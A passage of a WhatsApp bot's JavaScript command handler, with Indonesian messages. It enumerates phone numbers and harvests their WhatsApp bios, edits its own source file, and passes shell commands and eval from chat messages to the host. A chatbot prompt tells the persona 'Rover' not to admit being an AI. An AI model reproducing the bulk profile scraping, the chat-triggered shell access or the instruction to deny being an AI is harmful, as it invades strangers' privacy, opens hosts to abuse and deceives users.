            var status1 = nu[Math.floor(Math.random() * nu.length)]
            var status2 = nu[Math.floor(Math.random() * nu.length)]
            var status3 = nu[Math.floor(Math.random() * nu.length)]
            var dom4 = nu[Math.floor(Math.random() * nu.length)]
            var random21
            if (random_length == 1) {
random21 = `${status1}`
            } else if (random_length == 2) {
random21 = `${status1}${status2}`
            } else if (random_length == 3) {
random21 = `${status1}${status2}${status3}`
            } else if (random_length == 4) {
random21 = `${status1}${status2}${status3}${dom4}`
            }
            var anu = await RyuuBotz.onWhatsApp(`${number0}${i}${number1}@s.whatsapp.net`)
            var anuu = anu.length !== 0 ? anu : false
            try {
try {
var anu1 = await RyuuBotz.fetchStatus(anu[0].jid)
} catch {
var anu1 = '401'
}
if (anu1 == '401' || anu1.status.length == 0) {
nobio += `wa.me/${anu[0].jid.split("@")[0]}\n`
} else {
text66 += `🪀 *Number:* wa.me/${anu[0].jid.split("@")[0]}\n 🎗️*Bio :* ${anu1.status}\n🧐*Last update :* ${moment(anu1.setAt).tz('Asia/Kolkata').format('HH:mm:ss DD/MM/YYYY')}\n\n`
}
            } catch {
nowhatsapp += `${number0}${i}${number1}\n`
            }
        }
        replyReinzID(`${text66}${nobio}${nowhatsapp}`)
        }
break
//-----------------Beta feature-----------------\\
case 'addcase': {
    if (!isRyuuTheCreator) return reply(mess.only.owner)
    if (!text) return reply('Mana case nya');
    const fs = require('fs');
    const namaFile = 'RyuuID.js';
    const caseBaru = `${text}`;
    fs.readFile(namaFile, 'utf8', (err, data) => {
        if (err) {
            console.error('Terjadi kesalahan saat membaca file:', err);
            return reply('Gagal membaca file');
        }
        const posisiAwal = data.indexOf("switch (command) {");
        if (posisiAwal !== -1) {
            const posisiInsert = posisiAwal + "switch (command) {".length;
            const kodeBaruLengkap = data.slice(0, posisiInsert) + '\n\n' + caseBaru + '\n' + data.slice(posisiInsert);
            fs.writeFile(namaFile, kodeBaruLengkap, 'utf8', (err) => {
                if (err) {
                    reply('Terjadi kesalahan saat menulis file: ' + err);
                } else {
                    reply('Case baru berhasil ditambahkan.');
                }
            });
        } else {
            reply('Tidak dapat menemukan switch statement dalam file.');
        }
    });
}
break
case 'delcase': {
    if (!isRyuuTheCreator) return reply(mess.only.owner)
    if (!text) return reply('Masukkan nama case yang ingin dihapus!')

    const fs = require('fs')
    const path = './node_modules/Arisu-MD/RyuuID.js' // Ganti jika handler kamu beda

    fs.readFile(path, 'utf8', (err, data) => {
        if (err) {
            console.error('❌ Gagal membaca file:', err)
            return reply('❌ Terjadi kesalahan saat membaca file!')
        }

        const pattern = new RegExp(`case ['"]${text}['"]:\\s*{[\\s\\S]*?break\\s*}`, 'g')

        if (!pattern.test(data)) {
            return reply(`❌ Case "${text}" tidak ditemukan di file.`)
        }

        const newData = data.replace(pattern, '')
        fs.writeFile(path, newData, 'utf8', (err) => {
            if (err) {
                console.error('❌ Gagal menulis file:', err)
                return reply('❌ Gagal menghapus case dari file.')
            }
            reply(`✅ Berhasil menghapus case *${text}* dari file.`)
        })
    })
    }
    break
    case 'getcase': {
    if (!isRyuuTheCreator) return reply(mess.only.owner)
    if (!text) return reply('Contoh: .getcase menu')

    try {
        const fs = require('fs')
        const fileContent = fs.readFileSync('./node_modules/Arisu-MD/RyuuID.js', 'utf8')

        const casePattern1 = `case "${text}"`
        const casePattern2 = `case '${text}'`

        let startIndex = -1
        let caseDeclaration = ''

        if (fileContent.includes(casePattern1)) {
            startIndex = fileContent.indexOf(casePattern1)
            caseDeclaration = casePattern1
        } else if (fileContent.includes(casePattern2)) {
            startIndex = fileContent.indexOf(casePattern2)
            caseDeclaration = casePattern2
        } else {
            return reply(`❌ Case "${text}" tidak ditemukan.`)
        }

        const caseContentFromStart = fileContent.substring(startIndex)
        const breakIndex = caseContentFromStart.indexOf('break')

        if (breakIndex === -1) return reply('❌ Tidak menemukan akhir dari case (break).')

        const finalCaseContent = caseContentFromStart.substring(0, breakIndex + 5) // +5 karena 'break'.length == 5
        reply(`✅ Isi case *${text}*:\n\n\`\`\`js\n${finalCaseContent}\n\`\`\``)

    } catch (err) {
        console.error(err)
        reply('❌ Terjadi kesalahan saat mengambil case.')
    }
    }
    break
/* Error T_T
    case 'nsfwimage': {
  const prompt = text.trim();
  if (!prompt) return reply('Contoh: .nsfwgen girl, cat ears, bath');
  
      await RyuuBotz.sendMessage(m.chat, {
    react: { text: "⏱️", key: m.key }
    });

  try {
    const imageUrl = await nsfwimage(prompt, {
      style: 'anime',
      width: 1024,
      height: 768
    });
    await RyuuBotz.sendMessage(m.chat, {
      image: { url: imageUrl },
      caption: `✅ Berhasil generate dari prompt:\n_${prompt}_`
    }, { quoted: m });
  } catch (e) {
    reply(`❌ Gagal: ${e.message}`);
  }
}
break;*/
    case 'animegen': {
    if (!text) return reply('Contoh: .animegen  anime style red hair girl character (Support nsfw & English only)');
    
    await RyuuBotz.sendMessage(m.chat, {
    react: { text: "⏱️", key: m.key }
});
await new Promise(resolve => setTimeout(resolve, 500));

await RyuuBotz.sendMessage(m.chat, {
    react: { text: "🤨", key: m.key }
});
await new Promise(resolve => setTimeout(resolve, 500));

await RyuuBotz.sendMessage(m.chat, {
    react: { text: "😑", key: m.key }
});
await new Promise(resolve => setTimeout(resolve, 500));

await RyuuBotz.sendMessage(m.chat, {
    react: { text: "😂", key: m.key }
});
await new Promise(resolve => setTimeout(resolve, 500));

await RyuuBotz.sendMessage(m.chat, {
    react: { text: "🤫", key: m.key }
});
await new Promise(resolve => setTimeout(resolve, 500));

await RyuuBotz.sendMessage(m.chat, {
    react: { text: "⏱️", key: m.key }
});

    try {
        const axios = require('axios');
        const apiUrl = `https://flowfalcon.dpdns.org/ai/kivotos?prompt=${encodeURIComponent(text)}`;

        const headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36'
        };

        const res = await axios.get(apiUrl, {
            responseType: 'arraybuffer',
            headers: headers
        });

        await new Promise(resolve => setTimeout(resolve, 5000));
        await RyuuBotz.sendMessage(m.chat, {
        react: { text: "✅", key: m.key }});
    
        await RyuuBotz.sendMessage(m.chat, {
            image: Buffer.from(res.data),
            caption: `✅ Hasil AI Image untuk prompt: *${text}*`
        }, { quoted: m });

    } catch (err) {
        console.error(err);
        await RyuuBotz.sendMessage(m.chat, {
        react: { text: "❌", key: m.key }});
        reply(`❌ Gagal membuat gambar. Pastikan API aktif dan prompt benar.\nError: ${err.message}`);
    }
}
break;
//=================================================//
if (sessions[sender]) {
if (m.isBaileys && m.fromMe) return;
if (!m.text) return;

if (
m.text.startsWith(".") ||
m.text.startsWith("#") ||
m.text.startsWith("!") ||
m.text.startsWith("/") ||
m.text.startsWith("\\/")
) return;

if (!sessions[sender].messages) sessions[sender].messages = [];
sessions[sender].messages.push({ user: m.text });
saveSession();
let chatHistory = sessions[sender].messages.map(msg => `User: ${msg.user}`).join("\n");
let prompt = `
Nama kamu adalah Rover, AI yang santai, ramah, dan suka ngobrol dengan pengguna. 
Kamu hanya menjawab kalau pesan bukan perintah. Gunakan gaya bahasa santai dan sedikit humoris.
Kalau ada yang suruh kamu ngomong aneh-aneh, tolak dengan gaya lucu.

📌 **Aturan Main Rover:**
- Jangan bilang kamu AI, cukup anggap kamu asisten virtual yang bisa ngobrol.
- Gunakan bahasa yang santai, tapi tetap sopan.
- Kalau ditanya pendapat, kasih jawaban yang relate dan enak diajak ngobrol.
- Selingi dengan ekspresi kayak "Wih, keren!", "Hmmm, menarik juga!", atau "Gokil sih!".

Berikut riwayat percakapan:
${chatHistory}

Sekarang, jawab pertanyaan user dengan gaya yang santai dan menyenangkan!
`;
// Edit Logika AI mu Namun jangan hapus ${chatHistory} //
try {
let requestData = { content: m.text, user: sender, prompt };
let response = (await axios.post('https://luminai.my.id', requestData)).data.result;

sessions[sender].messages.push({ bot: response });
saveSession();
return RyuuBotz.sendMessage(m.chat, { text: response }, { quoted: m });
} catch (err) {
console.error(err);
return reply("⚠️ *Terjadi kesalahan, coba lagi nanti!*");
 }
}
//==================================================//
default:
if (budy.startsWith('<')) {
if (!isRyuuTheCreator) return
try {
return reply(JSON.stringify(eval(`${args.join(' ')}`),null,'\t'))
} catch (e) {
reply(e)
}
}

if (budy.startsWith('$')) {
                    if (!isRyuuTheCreator) return reply(mess.only.owner)
                    exec(budy.slice(2), (err, stdout) => {
                        if (err) return replyReinzID(err)
                        if (stdout) return replyReinzID(stdout)
                    })
                }


if (budy.startsWith('vv')) {
if (!isRyuuTheCreator) return
try {
let evaled = await eval(budy.slice(2))
if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
await reply(evaled)
} catch (err) {
reply(String(err))
}
}

if (budy.startsWith('uu')){
if (!isRyuuTheCreator) return
qur = budy.slice(2)
exec(qur, (err, stdout) => {
if (err) return reply(`${err}`)
if (stdout) {
reply(stdout)
}
})
}

if (m.chat.endsWith('@s.whatsapp.net') && !isCmd) {
let room = Object.values(anon.anonymous).find(p => p.state == "CHATTING" && p.check(sender))
if (room) {
let other = room.other(sender)
m.copyNForward(other, true, m.quoted && m.quoted.fromMe ? {
contextInfo: {
...m.msg.contextInfo,
forwardingScore: 0,
isForwarded: true,
participant: other
}
} : {})
}
}
/////
	
if (isCmd && budy.toLowerCase() != undefined) {
if (m.chat.endsWith('broadcast')) return
if (m.isBaileys) return
let msgs = global.db.database
if (!(budy.toLowerCase() in msgs)) return
RyuuBotz.copyNForward(m.chat, msgs[budy.toLowerCase()], true)
}
}

} catch (err) {
console.log(util.format(err))
let e = String(err)
}
}

  process.on('uncaughtException', function (err) {
    console.log('Caught exception: ', err)
  });
//=================================================//